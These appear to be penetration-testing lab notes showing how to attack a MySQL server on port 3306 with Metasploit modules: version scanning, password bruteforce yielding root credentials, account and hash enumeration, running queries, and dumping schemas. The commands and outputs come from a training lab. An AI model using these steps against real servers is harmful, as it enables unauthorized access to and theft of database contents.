Relational **database** that use the TCP port **3306**
# Version
To get the mysql version of the website, use the `auxiliary/scanner/mysql/mysql_version` module
```bash
msf6 > use auxiliary/scanner/mysql/mysql_version 
msf6 auxiliary(scanner/mysql/mysql_version) > run

[+] 192.183.144.3:3306 - 192.183.144.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.183.144.3:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Bruteforce
You can bruteforce a mysql server connection with
```bash
msf6 > use auxiliary/scanner/mysql/mysql_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session

msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FiLE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf6 auxiliary(scanner/mysql/mysql_login) > run
[-] 192.183.144.3:3306    - 192.183.144.3:3306 - LOGIN FAILED: root:chicago (Incorrect: Access denied for user 'root'@'INE' (using password: YES))
[+] 192.183.144.3:3306    - 192.183.144.3:3306 - Success: 'root:twinkle'
[*] 192.183.144.3:3306    - Scanned 1 of 1 hosts (100% complete)
[*] 192.183.144.3:3306    - Bruteforce completed, 1 credential was successful.
[*] 192.183.144.3:3306    - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
# Enum
With the credentials you can use the `auxiliary/admin/mysql/mysql_enum` to enumerate a lot of information
```bash
msf6 > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
PASSWORD => twinkle

msf6 auxiliary(admin/mysql/mysql_enum) > set USERNAME root
USERNAME => root
uxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
PASSWORD => twinkle
msf6 auxiliary(admin/mysql/mysql_enum) > set USERNAME root
USERNAME => root
msf6 auxiliary(admin/mysql/mysql_enum) > run
[*] Running module against 192.183.144.3

[*] 192.183.144.3:3306 - Running MySQL Enumerator...
[*] 192.183.144.3:3306 - Enumerating Parameters
[*] 192.183.144.3:3306 -        MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.183.144.3:3306 -        Compiled for the following OS: debian-linux-gnu
[*] 192.183.144.3:3306 -        Architecture: x86_64
[*] 192.183.144.3:3306 -        Server Hostname: demo.ine.local
[*] 192.183.144.3:3306 -        Data Directory: /var/lib/mysql/
[*] 192.183.144.3:3306 -        Logging of queries and logins: OFF
[*] 192.183.144.3:3306 -        Old Password Hashing Algorithm OFF
[*] 192.183.144.3:3306 -        Loading of local files: ON
[*] 192.183.144.3:3306 -        Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.183.144.3:3306 -        Allow Use of symlinks for Database Files: YES
[*] 192.183.144.3:3306 -        Allow Table Merge: 
[*] 192.183.144.3:3306 -        SSL Connection: DISABLED
[*] 192.183.144.3:3306 - Enumerating Accounts:
[*] 192.183.144.3:3306 -        List of Accounts with Password Hashes:
[+] 192.183.144.3:3306 -                User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
...
[*] 192.183.144.3:3306 -                User: filetest Host: %
[*] 192.183.144.3:3306 -                User: root Host: %
[*] Auxiliary module execution completed
```
# Execute Query
https://www.datameer.com/blog/sql_how-to-display-all-the-tables-from-a-database/
To interact and run query with the database, you can use the **`auxiliary/admin/mysql/mysql_sql`** module
```bash
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root

msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
PASSWORD => twinkle

msf6 auxiliary(admin/mysql/mysql_sql) > set SQL SELECT table_name, table_type FROM information_schema.tables
SQL => SELECT table_name, table_type FROM information_schema.tables

msf6 auxiliary(admin/mysql/mysql_sql) > run
...
[*] 192.183.144.3:3306 -  | performance_timers | BASE TABLE |
[*] 192.183.144.3:3306 -  | rwlock_instances | BASE TABLE |
[*] 192.183.144.3:3306 -  | setup_consumers | BASE TABLE |
[*] 192.183.144.3:3306 -  | setup_instruments | BASE TABLE |
[*] 192.183.144.3:3306 -  | setup_timers | BASE TABLE |
[*] 192.183.144.3:3306 -  | threads | BASE TABLE |
[*] Auxiliary module execution completed
```
# Dump database
You can dump all the database with the module **`auxiliary/scanner/mysql/mysql_schemadump`**
```bash
msf6 > use auxiliary/scanner/mysql/mysql_schemadump

msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
USERNAME => root

msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD twinkle
PASSWORD => twinkle

msf6 auxiliary(scanner/mysql/mysql_schemadump) > run

[+] 192.183.144.3:3306 - Schema stored in: /root/.msf4/loot/20241018130313_mysql_192.183.144.3_mysql_schema_830066.txt
[+] 192.183.144.3:3306 - MySQL Server Schema 
 Host: 192.183.144.3 
 Port: 3306 
 ====================

---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []

[*] 192.183.144.3:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Connect
```bash
$> mysql 192.183.144.3 -u root -p
Enter password: 
```